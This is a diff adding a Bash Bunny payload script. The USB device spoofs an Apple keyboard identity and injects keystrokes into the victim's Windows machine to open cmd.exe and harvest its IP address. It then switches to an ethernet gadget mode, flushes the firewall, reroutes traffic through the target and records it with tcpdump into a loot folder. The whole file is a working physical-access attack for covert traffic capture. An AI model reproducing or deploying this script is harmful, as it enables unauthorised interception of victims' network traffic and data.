@@ -1,0 +1,68 @@
+if [ -f "/root/udisk/payloads/connectedip.txt" ] ; then
+    rm /root/udisk/payloads/connectedip.txt
+fi
+ATTACKMODE STORAGE HID VID_0X05AC PID_0X021E
+DELAY 3000
+LED R G B 1000
+QUACK GUI r
+QUACK STRING cmd.exe
+QUACK ENTER
+DELAY 100
+QUACK STRING for \/f \%d in \(\'wmic volume get driveletter\^, label \^\| findstr \"BashBunny\"\'\) do set mybb\=\%d 
+QUACK ENTER
+DELAY 2000
+QUACK SPACE
+QUACK STRING set ip_address_string\=\"IPv4 Address\"
+QUACK ENTER
+DELAY 1000
+QUACK SPACE
+QUACK STRING for \/f \"usebackq tokens\=2 delims\=\:\" \%f in \(\`ipconfig \^\| findstr \/c\:\%ip_address_string\%\`\) do set bbIP\=\%f
+QUACK ENTER
+DELAY 1000
+QUACK STRING echo \%mybb\%
+QUACK ENTER
+QUACK STRING echo \%bbIP\%
+QUACK ENTER
+DELAY 1000
+QUACK SPACE
+QUACK STRING echo \%bbIP\% 
+QUACK SPACE
+QUACK STRING \> \%mybb\% 
+QUACK STRING \/payloads\/connectedip
+QUACK STRING .
+QUACK STRING txt
+QUACK ENTER
+DELAY 100
+QUACK STRING exit
+QUACK ENTER
+
+ATTACKMODE RNDIS_ETHERNET 
+#ATTACKMODE ECM_ETHERNET
+LED B 200
+source bunny_helpers.sh
+lootfolder="/root/udisk/payloads/$SWITCH_POSITION/loot"
+if [ ! -d $lootfolder ] ; then 
+    mkdir $lootfolder
+fi
+if [ ! -f "/root/udisk/payloads/connectedip.txt" ] ; then
+    LED R 100
+    exit
+fi
+InternetIP=$(cat /root/udisk/payloads/connectedip.txt)
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+DELAY 1000
+ip route del
+ip route del
+iptables -F
+iptables -X
+iptables -I INPUT -j ACCEPT
+iptables -A OUTPUT -j ACCEPT 
+iptables -A FORWARD -j ACCEPT 
+ip route flush 0.0.0.0
+route add 0.0.0.0 gw $TARGET_IP netmask 0.0.0.0 dev usb0
+DELAY 1000
+ip route add $InternetIP via $TARGET_IP dev usb0
+
+LED R B
+tcpdump -i usb0 > $lootfolder/tcpdump.txt
